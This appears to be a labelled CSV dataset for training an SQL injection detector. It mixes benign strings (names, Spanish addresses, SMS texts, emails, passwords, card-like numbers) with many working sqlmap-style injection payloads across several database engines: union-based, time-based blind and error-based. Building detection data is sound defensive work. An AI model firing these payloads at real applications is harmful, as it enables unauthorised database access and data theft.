payload,label
-9997 OR (2160=2160)*7241,1
"cbHd'));SELECT * FROM GENERATE_SERIES(6502,6502,CASE WHEN (6502=8784) THEN 1 ELSE 0 END) LIMIT 1--",1
will,0
"-4261) AS ZmmM WHERE 3073=3073 UNION ALL SELECT 3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073,3073#",1
cbHd') WHERE 7610=7610 OR 8285=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- kqGS,1
"')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dauG",1
"1',(case when 8260=8260 then 1 else null end)",1
pruja lantadilla,0
2mpav8nar,0
68201502q,0
"(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",1
-8625')) AS bhpx WHERE 4592=4592 OR (SELECT (CASE WHEN (2902=4727) THEN NULL ELSE CAST((CHR(90)||CHR(85)||CHR(74)||CHR(89)) AS NUMERIC) END)) IS NULL-- Smpd,1
strom.mahieuy4@karldeux.ac,0
"-5891 union all select 7103,7103,7103,7103--",1
rocky,0
75p80ica,0
"-2163`) WHERE 8905=8905 UNION ALL SELECT 8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905,8905-- XhSx",1
"1"" )  where 3393 = 3393 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
sqlmap/1.4.4#stable (http://sqlmap.org)') RLIKE SLEEP(5) AND ('QntC'='QntC,1
28081986,0
5546391843457163,0
"vUXo"" OR (SELECT 6063 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(6063=6063,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ""kBgP""=""kBgP",1
"https://keystrokebiometrics.xyz:443/) OR 8330=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- PnPw",1
"1' )  where 3271 = 3271 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
zorrilla guevara,0
c/ trujillo 155 4?g,0
-1513' OR 6772 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (6772=6772) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- VVEa,1
mammoth,0
"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
5292453383315406,0
italo,0
"sexC)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-3764""))) UNION ALL SELECT 6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045,6045#",1
") AS gMeo WHERE 4694=4694 OR 1136=BENCHMARK(5000000,MD5(0x714b7842))-- LoRV",1
"-4849"") AS EFfm WHERE 3688=3688 UNION ALL SELECT 3688,3688,3688,3688,3688,3688,3688,3688,3688-- kiOD",1
"-4641' UNION ALL SELECT 4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148,4148#",1
buisn andres,0
gringo,0
-8269'))) OR 2227=3366 AND ((('UBbB'='UBbB,1
segovia,0
Think i might have to give it a miss. Am teaching til twelve then have lecture at two. Damn this working thing.,0
vegeta,0
5462359635999525,0
Its hard to believe things like this. All can say lie but think twice before saying anything to me.,0
"-3703""))) union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1
"EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(8966=8966,1))),0x716a786a71,0x78))x))",1
maribeth4,0
demon,0
"-3475'))) UNION ALL SELECT 1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648,1648#",1
mandy1,0
bamboo,0
p57at84o,0
"1%""));select (case when (9931=3424) then 1 else 9931*(select 9931 from master..sysdatabases) end)--",1
"TAAm') OR 4973=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(117)||CHR(75)||CHR(66),5)--",1
samieian7,0
"cbHd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PkWm",1
27001,0
"cbHd'||(SELECT 0x6e68684e WHERE 5233=5233 OR (SELECT 2035 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(2035=2035,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'",1
"-4274) UNION ALL SELECT 4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356,4356#",1
"-6061"") UNION ALL SELECT 9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446,9446#",1
"') AS tGWs WHERE 5658=5658 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
guango,0
"vyHv"" OR CHAR(120)||CHAR(71)||CHAR(84)||CHAR(83)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)--",1
dept.,0
"-1147' UNION ALL SELECT 5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347,5347-- Anep",1
alcoleja,0
infalibilidad,0
torremocha de jiloca,0
651,0
AND 1602=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (1602=1602) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- TtnV,1
jarad,0
fleugel7,0
"vyHv',(SELECT (CASE WHEN (3947=9048) THEN 1 ELSE 1/(SELECT 0) END))-- qJCQ",1
"-7757"")) AS pbhp WHERE 9978=9978 OR MAKE_SET(6951=4674,4674)-- XAPu",1
10071990,0
10460,0
alcoroches,0
25152,0
cbHd' IN BOOLEAN MODE);SELECT CASE WHEN 2360=9387 THEN 1 ELSE NULL END--,1
") OR 6995=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- bafu",1
"vyHv' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1
-7898 ORDER BY 1480#,1
"vyHv"") WHERE 8387=8387 AND 7142=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--",1
"calle duque de zaragoza s/n,",0
"-2467 UNION ALL SELECT 2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096,2096#",1
"-7014) OR (SELECT (CASE WHEN (5450=5450) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5450) END) FROM DUAL) IS NULL-- RmzP",1
cimoteo,0
urbon,0
"1"")));begin user_lock.sleep(5); end and (((""memh"" like ""memh",1
dafydd@mytanga.nf,0
"vUXo"")) AS rxRw WHERE 5476=5476 OR 3081=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))-- iupi",1
"-4907' OR 8957=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (8957=8957) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) OR 'ESoW'='vQRQ",1
Hmm ok i'll stay for like an hour cos my eye is really sore!,0
Can you do online transaction?,0
"DtRW"") AS rlal WHERE 5567=5567 AND 8701=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8701=8701) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))-- ixjb",1
"1"" )  where 8878 = 8878 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
59323170y,0
"sexC"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZHMp",1
cbHd`) WHERE 1158=1158 AND 2244=(SELECT 2244 FROM PG_SLEEP(5))-- JYQj,1
')) AS bYQN WHERE 2871=2871;SELECT (CASE WHEN (2975=2803) THEN 2975 ELSE 1/(SELECT 0) END)--,1
"TAAm"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ieQK",1
"-8459 UNION ALL SELECT 7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271,7271-- kGuv",1
"vUXo||(SELECT 0x5a6b5a45 FROM DUAL WHERE 1037=1037 OR EXTRACTVALUE(5699,CONCAT(0x5c,0x7176707171,(SELECT (ELT(5699=5699,1))),0x716a786a71)))||",1
Will you come online today night,0
"1"" where 8241 = 8241 union all select null,null,null#",1
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'wuux' = 'wuux,1
"-1772""))) UNION ALL SELECT 2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128,2128#",1
This weeks SavaMob member offers are now accessible. Just call 08709501522 for details! SavaMob POBOX 139 LA3 2WU. Only £1.50/week. SavaMob - offers mobile!,0
33160,0
"cbHd')) AS qtvI WHERE 5161=5161 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2409=2409,1))),0x716a786a71,0x78))x))-- IoGU",1
"-2496)) AS urQd WHERE 7182=7182 UNION ALL SELECT 7182,7182,7182,7182,7182,7182,7182,7182,7182,7182,7182,7182#",1
"-2168"") AS jKjX WHERE 7791=7791 UNION ALL SELECT 7791,7791,7791,7791,7791,7791,7791,7791,7791,7791,7791#",1
14973109v,0
"https://keystrokebiometrics.xyz:443/)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XClR",1
"sqlmap/1.4.4#stable (http://sqlmap.org)')) AS CWfJ WHERE 2394=2394 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RHWO",1
"1'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#",1
repulsivo,0
ramaje,0
n2ga1,0
4159457629727955,0
04051988,0
derparol,0
""" UNION ALL SELECT NULL,NULL#",1
5202,0
1'+ ( select cxvy where 7421 = 7421,1
Match started.india  &lt;#&gt;  for 2,0
"-6910"" UNION ALL SELECT 4867,4867,4867,4867,4867,4867,4867,4867,4867,4867,4867,4867,4867,4867,4867,4867#",1
gaylord,0
"cbHd') WHERE 9105=9105 OR ROW(7236,6829)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(7236=7236,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 1942 UNION SELECT 7386 UNION SELECT 5595 UNION SELECT 4960)a GROUP BY x)-- QXFc",1
milani4@beautifulbody.sh,0
"vyHv"" ORDER BY 1#",1
nada,0
san cibrao das vias,0
fuentelmonge,0
44650,0
ginette,0
"-2423'))) UNION ALL SELECT 4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213,4213#",1
los caprichos 126,0
roldan,0
33371147x,0
"cbHd"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZMxV",1
norma,0
"sexC"") AS GPra WHERE 9980=9980 OR 7011=BENCHMARK(5000000,MD5(0x71676f70))#",1
"` WHERE 9731=9731 UNION ALL SELECT NULL,NULL,NULL,NULL#",1
maxdog,0
"-6618""))) order by 1#",1
You will be in the place of that man,0
pl. san juan harria 141,0
6054,0
"DtRW UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-3736' UNION ALL SELECT 9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947,9947-- MVsz",1
sqlmap/1.4.4#stable (http://sqlmap.org)');SELECT CASE WHEN 8937=8484 THEN 1 ELSE NULL END--,1
"camino ermita de la torre, 129,",0
"c/ florida, 61 4?c",0
0) UNION ALL SELECT NULL NULL NULL-- AND (7835=7835,1
periodistes 179,0
tddnewsletter@emc1.co.uk (More games from TheDailyDraw) Dear Helen Dozens of Free Games - with great prizesWith..,0
sqlmap/1.4.4#stable (http://sqlmap.org)')) AND 2685=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (2685=2685) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND (('zXuX' LIKE 'zXuX,1
Gud ni8 dear..slp well..take care..swt dreams..Muah..,0
https://keystrokebiometrics.xyz:443/) HAVING 8811=7562-- Pjho,1
"calle vivero, s/n",0
https://keystrokebiometrics.xyz:443/') AS lhlU WHERE 3961=3961 ORDER BY 3950#,1
brivio,0
DtRW`) WHERE 6291=6291 AND (SELECT 1254 FROM (SELECT(SLEEP(5)))mEzz)#,1
"-2949'))) UNION ALL SELECT 4060,4060,4060-- SiPx",1
6382,0
negrich,0
"-9384) UNION ALL SELECT 8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998#",1
1 order by 1--,1
""")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iqHc",1
5348,0
"https://keystrokebiometrics.xyz:443/')) AS Pmeb WHERE 7421=7421 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
titanic,0
"-6190)) AS OsFw WHERE 8210=8210 UNION ALL SELECT 8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210,8210#",1
"-6431"" UNION ALL SELECT 4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223,4223-- kobp",1
sqlmap/1.4.4#stable (http://sqlmap.org)'))) UNION ALL SELECT NULL-- DyLI,1
winners,0
"1' )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( 'blnh' like 'blnh",1
luena,0
0957098737909112,0
92,0
"1"")) as rcse where 4559=4559 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
) WAITFOR DELAY '0:0:5'--,1
grelck,0
ketley,0
"-5792"" OR (9436=8042)*8042 AND ""vzCT""=""vzCT",1
"1%""  )  )   and 7533 = 7533 and   (  (  ""%"" = """,1
capital,0
morn de almazn,0
nolay,0
cookie1,0
Dis is yijue. I jus saw ur mail. In case huiming havent sent u my num. Dis is my num.,0
8151,0
sampedro,0
"cbHd"")) AND 6923=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",1
Dizzamn aight I'll ask my suitemates when I get back,0
dubarry@soyrojo.tr,0
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))# fmxq",1
amsterda,0
"TAAm"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-5419) AS jCCA WHERE 9111=9111 OR 1 GROUP BY CONCAT(0x7176707171,(SELECT (CASE WHEN (2856=2856) THEN 1 ELSE 0 END)),0x716a786a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#",1
))) OR (SELECT 8255 FROM (SELECT(SLEEP(5)))QXur) AND (((4802=4802,1
"-8963""))) UNION ALL SELECT 3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941,3941#",1
"`=`` AND 5391=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (5391=5391) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND ``=`",1
kindelan,0
inamulla,0
garladora,0
najli,0
') AS vvnw WHERE 4652=4652 OR 6949=(SELECT 6949 FROM PG_SLEEP(5))--,1
6212,0
"https://keystrokebiometrics.xyz:443/) OR ELT(2892=2892,SLEEP(5))#",1
7297834291786721,0
1'  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  'krvo' like 'krvo,1
"'+(SELECT yHmt WHERE 9162=9162 OR 3560=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))+'",1
What???? Hello wats talks email address?,0
vilaprio,0
"-6446 UNION ALL SELECT 9521,9521,9521,9521,9521,9521,9521,9521,9521,9521,9521,9521,9521,9521,9521#",1
vyHv RLIKE (SELECT 2026 FROM (SELECT(SLEEP(5)))ruWb)-- svkI,1
mastelero,0
47355557y,0
""" UNION ALL SELECT NULL#",1
"sqlmap/1.4.4#stable (http://sqlmap.org)"") AS DsAf WHERE 3417=3417 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
pericas espaulella,0
"cbHd"" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(2934=2934,1))),0x716a786a71)) USING utf8))) AND ""dwNe""=""dwNe",1
"'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
sqlmap/1.4.4#stable (http://sqlmap.org)+(SELECT kOow WHERE 3543=3543 AND 9621=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))+,1
vidom.kapatos@discotecateatre.om,0
claudine,0
16101987,0
"-5065"") UNION ALL SELECT 1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438,1438-- PgTh",1
"' IN BOOLEAN MODE) AND 2342=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))#",1
"-3358"") UNION ALL SELECT 9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223,9223-- eLiK",1
19310,0
"-3408"") AS YfKz WHERE 4026=4026 UNION ALL SELECT 4026,4026,4026,4026,4026,4026,4026,4026,4026-- HdrN",1
"TAAm) AS kZWw WHERE 3413=3413 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"UNION ALL SELECT NULL,NULL,NULL,NULL-- ValL",1
"-4076')) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1
christmas,0
papadouka_cuttinet@professionalhosting.com.il,0
aburgues1rs7,0
"-8293"")) UNION ALL SELECT 7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115,7115-- XhVL",1
""") AND SLEEP(5) AND (""puGf""=""puGf",1
"sqlmap/1.4.4#stable (http://sqlmap.org)""))) OR 8134=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((""gVUV"" LIKE ""gVUV",1
dentellar,0
inund!ar,0
All will come alive.better correct any good looking figure there itself..,0
cbHd)) AS zmIA WHERE 5879=5879 OR SLEEP(5)-- RXDn,1
"-5496' UNION ALL SELECT 9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883,9883#",1
sexC||(SELECT CHAR(112)+CHAR(67)+CHAR(71)+CHAR(111) WHERE 1218=1218 AND 7525 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7525=7525) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))))||,1
qwertyuiop,0
"-6202"")) UNION ALL SELECT 1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043,1043#",1
5481930163785901,0
97060354d,0
5sp0luz64m3ent8,0
amodeo sidany,0
"-1694"" UNION ALL SELECT 2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608,2608-- TcCe",1
desiree,0
charlie,0
7839,0
booth,0
jaraicejo,0
"-7484') UNION ALL SELECT 4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239#",1
6435,0
"sexC AND 5988=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(118)||CHR(73)||CHR(111),5)-- Xmzi",1
-2504'))) or 8723=9715,1
ambrosia,0
"DtRW) AS yinE WHERE 6584=6584 AND 9899=CTXSYS.DRITHSX.SN(9899,(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9899=9899) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)))-- lFxC",1
-6447) WHERE 6852=6852 OR 7810=(SELECT (CASE WHEN (7810=2629) THEN 7810 ELSE (SELECT 2629 UNION SELECT 3209) END))-- ioTD,1
"plaza pont 47, 6?e",0
2567,0
exchange,0
-7954) WHERE 5060=5060 OR 7566=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (7566=7566) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)))-- pkXb,1
"-3209) UNION ALL SELECT 2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868#",1
") AS IhyO WHERE 2283=2283 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
naresh,0
meredith,0
catoira,0
-2895')) OR 6315=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (6315=6315) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND (('waCj' LIKE 'waCj,1
10250,0
protoalbitar,0
1) WAITFOR DELAY '0:0:5'-- AND (5945=5945,1
